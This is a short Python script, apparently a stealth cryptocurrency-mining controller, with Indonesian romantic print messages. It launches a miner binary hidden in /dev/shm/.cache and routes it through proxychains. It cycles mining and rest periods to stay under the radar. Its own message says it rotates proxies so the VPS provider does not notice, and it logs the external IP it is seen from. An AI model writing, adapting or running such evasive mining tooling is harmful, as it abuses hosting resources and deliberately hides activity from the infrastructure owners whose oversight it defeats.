import os
import time
import sys
import signal

# CONFIG
MINER_PATH = "/dev/shm/.cache/tobrut"  # Lokasi miner
MINER_NAME = "tobrut"  # Nama miner buat kill
MINING_TIME = 3600  # 60 menit
REST_TIME = 600  # 10 menit
LOG_PATH = "/dev/shm/.cache/logs/sayangku.log"
PROXYCHAINS_BIN = "~/.local/bin/proxychains4"
PROXYCHAINS_CONF = "~/.proxychains/proxychains.conf"

def kill_miner():
    print("💔 Udah capek ya sayang... aku kill dulu yaa...")
    os.system(f"pkill -f {MINER_NAME}")
    sys.stdout.flush()

def start_miner():
    print("🚀 Jalanin Panen buat rumah kita di Bali...")
    command = f"nohup {PROXYCHAINS_BIN} -f {PROXYCHAINS_CONF} {MINER_PATH} > {LOG_PATH} 2>&1 &"
    print(f"💪 Start: {command}")
    os.system(command)
    sys.stdout.flush()
    time.sleep(5)
    os.system(f"{PROXYCHAINS_BIN} -f {PROXYCHAINS_CONF} curl ifconfig.me >> {LOG_PATH}")

def rotate_proxy():
    print("🔄 Rotasi Proxy biar gak ketahuan pihak VPS...")
    os.system(f"pkill -f {PROXYCHAINS_BIN}")
    time.sleep(2)

def main():
    while True:
        print("⛏️ Panen selama 60 menit buat modal nikah kita...")
        start_miner()
        time.sleep(MINING_TIME)

        print("💔 Udah capek ya sayang, aku kill dulu yaa...")
        kill_miner()

        print("🔄 Proxy Rotate Sayang... biar makin licin")
        rotate_proxy()

        print("😴 Istirahat dulu biar fresh...")
        time.sleep(REST_TIME)

def sigint_handler(sig, frame):
    print("💔 Aku tahu kamu capek, aku matiin mesinnya ya Sayang...")
    kill_miner()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    print("💓 Cinta Abadi v9 Jalan Sayangku... 💕")
    sys.stdout.flush()
    main()
